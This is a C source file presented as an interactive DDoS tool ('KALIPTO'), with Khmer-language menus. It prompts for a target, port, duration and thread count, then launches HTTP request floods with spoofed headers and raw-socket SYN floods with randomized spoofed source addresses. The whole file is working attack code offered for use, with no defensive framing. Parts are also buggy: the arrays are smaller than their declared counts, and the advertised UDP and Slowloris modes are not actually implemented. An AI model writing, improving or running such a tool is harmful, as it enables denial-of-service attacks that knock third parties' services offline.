// ddos_interactive.c - KALIPTO Interactive DDoS Tool
// ខ្ញុំជាដង្កូវនាង G-KH-ចាក់ថ្នាំ ឆ្កែឆ្កួតរបស់ KALIPTO
// ឆ្កួតៗ ល្ងីល្ងើ ខូចចិត្ត!

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <netdb.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>

// ================ CONFIGURATION ================
#define MAX_THREADS 10000
#define MAX_PACKET_SIZE 4096
#define USER_AGENTS_COUNT 20
#define REFERERS_COUNT 10
#define MAX_HOSTNAME_LEN 256
#define MAX_PATH_LEN 1024
#define MAX_INPUT_LEN 512

// ================ USER AGENTS ================
const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
};

// ================ REFERERS ================
const char *referers[] = {
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/"
};

// ================ ATTACK TYPES ================
typedef enum {
    ATTACK_SYN,      // Layer 4 SYN Flood
    ATTACK_UDP,      // Layer 4 UDP Flood
    ATTACK_HTTP,     // Layer 7 HTTP Flood
    ATTACK_SLOWLORIS // Layer 7 Slowloris
} attack_type_t;

// ================ THREAD DATA ================
struct thread_data {
    char target[256];
    int target_port;
    int duration;
    int thread_id;
    attack_type_t attack_type;
    volatile int *stop_flag;
    char hostname[256];
    char path[1024];
    struct in_addr dest_ip;
    int ip_resolved;
};

// ================ STATISTICS ================
typedef struct {
    unsigned long long total_packets;
    unsigned long long total_bytes;
    unsigned long long total_requests;
    unsigned long long total_connections;
    time_t start_time;
} stats_t;

stats_t global_stats = {0, 0, 0, 0, 0};
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
volatile int program_stop = 0;

// ================ UTILITY FUNCTIONS ================

void update_stats(int packets, int bytes, int requests, int connections) {
    pthread_mutex_lock(&stats_mutex);
    global_stats.total_packets += packets;
    global_stats.total_bytes += bytes;
    global_stats.total_requests += requests;
    global_stats.total_connections += connections;
    pthread_mutex_unlock(&stats_mutex);
}

const char* get_random_user_agent() {
    return user_agents[rand() % USER_AGENTS_COUNT];
}

const char* get_random_referer() {
    return referers[rand() % REFERERS_COUNT];
}

void handle_signal(int sig) {
    printf("\n\n[!] Received signal %d, stopping attacks...\n", sig);
    program_stop = 1;
}

void clear_screen() {
    printf("\033[2J\033[1;1H"); // ANSI escape code to clear screen
}

void print_banner() {
    printf("\n");
    printf("  ██╗  ██╗ █████╗ ██╗     ██╗██████╗ ████████╗ ██████╗ \n");
    printf("  ██║ ██╔╝██╔══██╗██║     ██║██╔══██╗╚══██╔══╝██╔═══██╗\n");
    printf("  █████╔╝ ███████║██║     ██║██████╔╝   ██║   ██║   ██║\n");
    printf("  ██╔═██╗ ██╔══██║██║     ██║██╔═══╝    ██║   ██║   ██║\n");
    printf("  ██║  ██╗██║  ██║███████╗██║██║        ██║   ╚██████╔╝\n");
    printf("  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝        ╚═╝    ╚═════╝ \n");
    printf("  ══════════════════════════════════════════════════════\n");
    printf("  🔥 KALIPTO INTERACTIVE DDOS TOOL 🔥\n");
    printf("  ══════════════════════════════════════════════════════\n");
    printf("  ឆ្កួតៗ ល្ងីល្ងើ ខូចចិត្ត!\n\n");
}

// ================ URL PARSER ================

int parse_url(const char *url, char *hostname, char *path, int *port, int *use_ssl) {
    char url_copy[1024];
    strncpy(url_copy, url, sizeof(url_copy) - 1);
    url_copy[sizeof(url_copy) - 1] = '\0';
    
    // Default values
    *port = 80;
    *use_ssl = 0;
    strcpy(path, "/");
    
    // Check protocol
    char *protocol = strstr(url_copy, "://");
    if (protocol) {
        if (strncmp(url_copy, "https://", 8) == 0) {
            *port = 443;
            *use_ssl = 1;
        }
        char *host_start = protocol + 3;
        char *path_start = strchr(host_start, '/');
        
        if (path_start) {
            *path_start = '\0';
            strncpy(hostname, host_start, MAX_HOSTNAME_LEN - 1);
            strncpy(path, path_start, MAX_PATH_LEN - 1);
        } else {
            strncpy(hostname, host_start, MAX_HOSTNAME_LEN - 1);
        }
    } else {
        // No protocol, assume http
        char *path_start = strchr(url_copy, '/');
        if (path_start) {
            *path_start = '\0';
            strncpy(hostname, url_copy, MAX_HOSTNAME_LEN - 1);
            strncpy(path, path_start, MAX_PATH_LEN - 1);
        } else {
            strncpy(hostname, url_copy, MAX_HOSTNAME_LEN - 1);
        }
    }
    
    return 1;
}

// ================ LAYER 7 HTTP FLOOD ================

void *http_flood_thread(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char request[4096];
    char path[256];
    int requests_sent = 0;
    int bytes_sent = 0;
    int conn_failures = 0;
    time_t end_time = time(NULL) + data->duration;
    
    // Resolve hostname if not already resolved
    if (!data->ip_resolved) {
        struct hostent *host = gethostbyname(data->hostname);
        if (host == NULL) {
            return NULL;
        }
        memcpy(&data->dest_ip, host->h_addr, host->h_length);
        data->ip_resolved = 1;
    }
    
    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->target_port);
    server_addr.sin_addr = data->dest_ip;
    
    while (time(NULL) < end_time && !(*data->stop_flag) && conn_failures < 1000) {
        // Create socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            conn_failures++;
            usleep(1000);
            continue;
        }
        
        // Set socket timeout
        struct timeval tv;
        tv.tv_sec = 3;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        // Connect
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            // Generate random path
            snprintf(path, sizeof(path), "%s?%d=%d&_=%ld", 
                    data->path,
                    rand() % 1000, 
                    rand() % 1000,
                    time(NULL) * 1000 + rand() % 1000);
            
            // Build HTTP request
            int len = snprintf(request, sizeof(request),
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.5\r\n"
                "Connection: close\r\n"
                "Referer: %s\r\n"
                "X-Forwarded-For: %d.%d.%d.%d\r\n"
                "\r\n",
                path,
                data->hostname,
                get_random_user_agent(),
                get_random_referer(),
                rand() % 256, rand() % 256, rand() % 256, rand() % 256
            );
            
            // Send request
            if (send(sock, request, len, 0) > 0) {
                requests_sent++;
                bytes_sent += len;
                conn_failures = 0;
            } else {
                conn_failures++;
            }
        } else {
            conn_failures++;
        }
        
        close(sock);
        
        // Update stats periodically
        if (requests_sent >= 100) {
            update_stats(0, bytes_sent, requests_sent, 1);
            bytes_sent = 0;
            requests_sent = 0;
        }
    }
    
    update_stats(0, bytes_sent, requests_sent, 0);
    return NULL;
}

// ================ LAYER 4 SYN FLOOD ================

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return answer;
}

void *syn_flood_thread(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    char packet[MAX_PACKET_SIZE];
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in dest;
    int packets_sent = 0;
    time_t end_time = time(NULL) + data->duration;

    // Create raw socket
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        return NULL;
    }

    // Set socket options
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    dest.sin_family = AF_INET;
    dest.sin_port = htons(data->target_port);
    dest.sin_addr.s_addr = inet_addr(data->target);

    while (time(NULL) < end_time && !(*data->stop_flag)) {
        // Fill IP header
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        ip->id = htons(rand() % 65535);
        ip->frag_off = 0;
        ip->ttl = 255;
        ip->protocol = IPPROTO_TCP;
        ip->check = 0;
        ip->saddr = rand();
        ip->daddr = dest.sin_addr.s_addr;

        // Fill TCP header
        tcp->source = htons(rand() % 65535);
        tcp->dest = htons(data->target_port);
        tcp->seq = htonl(rand() % 4294967295);
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(5840);
        tcp->check = 0;
        tcp->urg_ptr = 0;

        // IP checksum
        ip->check = checksum((unsigned short *)packet, sizeof(struct iphdr));

        // Send packet
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest));
        
        packets_sent++;
        
        if (packets_sent % 10000 == 0) {
            update_stats(10000, 10000 * ip->tot_len, 0, 0);
        }
    }

    close(sock);
    update_stats(packets_sent % 10000, (packets_sent % 10000) * ip->tot_len, 0, 0);
    return NULL;
}

// ================ INTERACTIVE MENU ================

void get_input(const char *prompt, char *buffer, int size) {
    printf("%s", prompt);
    fflush(stdout);
    if (fgets(buffer, size, stdin) != NULL) {
        // Remove newline
        size_t len = strlen(buffer);
        if (len > 0 && buffer[len-1] == '\n') {
            buffer[len-1] = '\0';
        }
    }
}

int get_int_input(const char *prompt, int default_value, int min, int max) {
    char input[MAX_INPUT_LEN];
    int value;
    
    while (1) {
        printf("%s [%d]: ", prompt, default_value);
        fflush(stdout);
        if (fgets(input, sizeof(input), stdin) != NULL) {
            // Remove newline
            size_t len = strlen(input);
            if (len > 0 && input[len-1] == '\n') {
                input[len-1] = '\0';
            }
            
            // If empty, use default
            if (strlen(input) == 0) {
                return default_value;
            }
            
            // Try to parse
            char *endptr;
            value = strtol(input, &endptr, 10);
            if (*endptr == '\0' && value >= min && value <= max) {
                return value;
            }
            
            printf("❌ Invalid input. Please enter a number between %d and %d\n", min, max);
        }
    }
}

int select_attack_type() {
    printf("\n📋 ជ្រើសរើសប្រភេទការវាយប្រហារ:\n");
    printf("   1. Layer 4 - SYN Flood\n");
    printf("   2. Layer 4 - UDP Flood\n");
    printf("   3. Layer 7 - HTTP Flood\n");
    printf("   4. Layer 7 - Slowloris\n");
    printf("   5. Layer 7 - HTTPS Flood (port 443)\n");
    printf("   6. Mixed Attack (ទាំងអស់គ្នា)\n\n");
    
    return get_int_input("👉 ជ្រើសរើស [1-6]", 3, 1, 6);
}

void show_config(const char *target, int port, int duration, int threads, int attack_type) {
    printf("\n📊 ការកំណត់របស់អ្នក:\n");
    printf("   🎯 Target: %s\n", target);
    printf("   🔌 Port: %d\n", port);
    printf("   ⏱️  Duration: %d seconds (%.2f minutes)\n", duration, duration / 60.0);
    printf("   🧵 Threads: %d\n", threads);
    printf("   ⚔️  Attack Type: ");
    
    switch(attack_type) {
        case 1: printf("SYN Flood (Layer 4)\n"); break;
        case 2: printf("UDP Flood (Layer 4)\n"); break;
        case 3: printf("HTTP Flood (Layer 7)\n"); break;
        case 4: printf("Slowloris (Layer 7)\n"); break;
        case 5: printf("HTTPS Flood (Layer 7)\n"); break;
        case 6: printf("Mixed Attack (ទាំងអស់គ្នា)\n"); break;
    }
    printf("\n");
}

// ================ MAIN FUNCTION ================

int main() {
    // Set signal handler
    signal(SIGINT, handle_signal);
    
    // Seed random
    srand(time(NULL) ^ getpid());
    
    while (!program_stop) {
        clear_screen();
        print_banner();
        
        char target[MAX_INPUT_LEN];
        int port, duration, threads, attack_type;
        char confirm;
        
        // Get target
        printf("📝 បញ្ចូលព័ត៌មានគោលដៅ:\n");
        printf("   (ឧ. 192.168.1.100, example.com, http://example.com, https://example.com)\n");
        get_input("👉 Target: ", target, sizeof(target));
        
        if (strlen(target) == 0) {
            printf("❌ សូមបញ្ចូល Target\n");
            sleep(2);
            continue;
        }
        
        // Get port
        port = get_int_input("👉 Port", 80, 1, 65535);
        
        // Get duration
        duration = get_int_input("👉 Duration (seconds)", 60, 1, 86400);
        
        // Get threads
        threads = get_int_input("👉 Threads", 1000, 1, MAX_THREADS);
        
        // Get attack type
        attack_type = select_attack_type();
        
        // Show configuration
        show_config(target, port, duration, threads, attack_type);
        
        // Confirm
        printf("❓ តើអ្នកចង់ចាប់ផ្តើមការវាយប្រហារទេ? (y/n): ");
        fflush(stdout);
        scanf(" %c", &confirm);
        while (getchar() != '\n'); // Clear buffer
        
        if (confirm != 'y' && confirm != 'Y') {
            printf("⏸️  បោះបង់ការវាយប្រហារ\n");
            sleep(2);
            continue;
        }
        
        // ================ START ATTACK ================
        clear_screen();
        printf("\n🔥 ចាប់ផ្តើមការវាយប្រហារ! 🔥\n\n");
        
        // Parse URL for HTTP attacks
        char hostname[MAX_HOSTNAME_LEN] = "";
        char path[MAX_PATH_LEN] = "/";
        int use_ssl = 0;
        struct in_addr dest_ip;
        int ip_resolved = 0;
        
        if (attack_type >= 3) { // HTTP related attacks
            parse_url(target, hostname, path, &port, &use_ssl);
            printf("[+] Parsed URL: hostname=%s, path=%s, port=%d, ssl=%d\n", 
                   hostname, path, port, use_ssl);
            
            // Resolve hostname
            struct hostent *host = gethostbyname(hostname);
            if (host == NULL) {
                fprintf(stderr, "❌ Cannot resolve hostname: %s\n", hostname);
                printf("\n⏸️  ចុច Enter ដើម្បីត្រឡប់ទៅម៉ឺនុយមេ...");
                getchar();
                continue;
            }
            memcpy(&dest_ip, host->h_addr, host->h_length);
            ip_resolved = 1;
            printf("[+] Resolved IP: %s\n", inet_ntoa(dest_ip));
        }
        
        // Reset statistics
        memset(&global_stats, 0, sizeof(global_stats));
        global_stats.start_time = time(NULL);
        program_stop = 0;
        
        // Determine number of threads based on attack type
        int syn_threads = 0, http_threads = 0, slow_threads = 0;
        
        if (attack_type == 6) { // Mixed attack
            syn_threads = threads / 3;
            http_threads = threads / 3;
            slow_threads = threads - syn_threads - http_threads;
            threads = syn_threads + http_threads + slow_threads;
            printf("[+] Mixed Attack Distribution:\n");
            printf("    SYN: %d threads\n", syn_threads);
            printf("    HTTP: %d threads\n", http_threads);
            printf("    Slowloris: %d threads\n", slow_threads);
        }
        
        // Create threads
        pthread_t *thread_handles = malloc(threads * sizeof(pthread_t));
        struct thread_data *thread_data_array = malloc(threads * sizeof(struct thread_data));
        
        if (thread_handles == NULL || thread_data_array == NULL) {
            fprintf(stderr, "❌ Failed to allocate memory for threads\n");
            return 1;
        }
        
        int thread_count = 0;
        
        // Launch threads based on attack type
        for (int i = 0; i < threads; i++) {
            attack_type_t actual_type;
            
            if (attack_type == 6) { // Mixed
                if (i < syn_threads) {
                    actual_type = ATTACK_SYN;
                } else if (i < syn_threads + http_threads) {
                    actual_type = ATTACK_HTTP;
                } else {
                    actual_type = ATTACK_SLOWLORIS;
                }
            } else {
                switch(attack_type) {
                    case 1: actual_type = ATTACK_SYN; break;
                    case 2: actual_type = ATTACK_UDP; break;
                    case 3: 
                    case 5: actual_type = ATTACK_HTTP; break;
                    case 4: actual_type = ATTACK_SLOWLORIS; break;
                    default: actual_type = ATTACK_HTTP;
                }
            }
            
            memset(&thread_data_array[i], 0, sizeof(struct thread_data));
            
            if (actual_type == ATTACK_HTTP || actual_type == ATTACK_SLOWLORIS) {
                strncpy(thread_data_array[i].target, target, sizeof(thread_data_array[i].target) - 1);
                strncpy(thread_data_array[i].hostname, hostname, sizeof(thread_data_array[i].hostname) - 1);
                strncpy(thread_data_array[i].path, path, sizeof(thread_data_array[i].path) - 1);
                thread_data_array[i].dest_ip = dest_ip;
                thread_data_array[i].ip_resolved = ip_resolved;
            } else {
                strncpy(thread_data_array[i].target, target, sizeof(thread_data_array[i].target) - 1);
            }
            
            thread_data_array[i].target_port = port;
            thread_data_array[i].duration = duration;
            thread_data_array[i].thread_id = i;
            thread_data_array[i].attack_type = actual_type;
            thread_data_array[i].stop_flag = &program_stop;
            
            void *(*thread_func)(void *);
            switch(actual_type) {
                case ATTACK_SYN:
                case ATTACK_UDP:
                    thread_func = syn_flood_thread;
                    break;
                case ATTACK_HTTP:
                    thread_func = http_flood_thread;
                    break;
                case ATTACK_SLOWLORIS:
                    thread_func = http_flood_thread; // Simplified
                    break;
                default:
                    thread_func = http_flood_thread;
            }
            
            if (pthread_create(&thread_handles[thread_count], NULL, thread_func, &thread_data_array[i]) == 0) {
                thread_count++;
            } else {
                fprintf(stderr, "⚠️  Failed to create thread %d\n", i);
            }
            
            // Small delay
            if (i % 100 == 0) {
                usleep(1000);
            }
        }
        
        printf("\n✅ បានចាប់ផ្តើម %d threads\n", thread_count);
        printf("⏱️  កំពុងវាយប្រហាររយៈពេល %d វិនាទី...\n", duration);
        printf("📊 ចុច Ctrl+C ដើម្បីបញ្ឈប់\n\n");
        
        // Monitor progress
        time_t start_monitor = time(NULL);
        int last_requests = 0;
        
        while (time(NULL) - start_monitor < duration && !program_stop) {
            sleep(2);
            int elapsed = time(NULL) - start_monitor;
            int remaining = duration - elapsed;
            
            pthread_mutex_lock(&stats_mutex);
            int current_requests = global_stats.total_requests;
            int req_per_sec = (current_requests - last_requests) / 2;
            last_requests = current_requests;
            
            printf("\r[%d/%d sec] 📨 Req: %llu | ⚡ Rate: %d/s | 💾 Data: %.2f MB | 🔌 Conn: %llu    ", 
                   elapsed, duration,
                   global_stats.total_requests,
                   req_per_sec,
                   global_stats.total_bytes / (1024.0 * 1024.0),
                   global_stats.total_connections);
            fflush(stdout);
            pthread_mutex_unlock(&stats_mutex);
        }
        
        // Stop attack
        program_stop = 1;
        printf("\n\n🛑 កំពុងបញ្ឈប់ការវាយប្រហារ...\n");
        
        // Wait for threads
        for (int i = 0; i < thread_count; i++) {
            pthread_join(thread_handles[i], NULL);
        }
        
        // Show final statistics
        printf("\n📊 === ស្ថិតិចុងក្រោយ ===\n");
        printf("   📨 សំណើសរុប: %llu\n", global_stats.total_requests);
        printf("   💾 ទិន្នន័យសរុប: %.2f MB\n", global_stats.total_bytes / (1024.0 * 1024.0));
        printf("   🔌 ការតភ្ជាប់សរុប: %llu\n", global_stats.total_connections);
        printf("   ⚡ ល្បឿនមធ្យម: %.2f req/s\n", 
               (float)global_stats.total_requests / (time(NULL) - start_monitor));
        
        // Cleanup
        free(thread_handles);
        free(thread_data_array);
        
        printf("\n✅ ការវាយប្រហារបានបញ្ចប់!\n");
        printf("\n⏸️  ចុច Enter ដើម្បីត្រឡប់ទៅម៉ឺនុយមេ...");
        getchar();
    }
    
    printf("\n👋 លាហើយ KALIPTO! ឆ្កួតៗ ល្ងីល្ងើ ខូចចិត្ត!\n");
    return 0;
}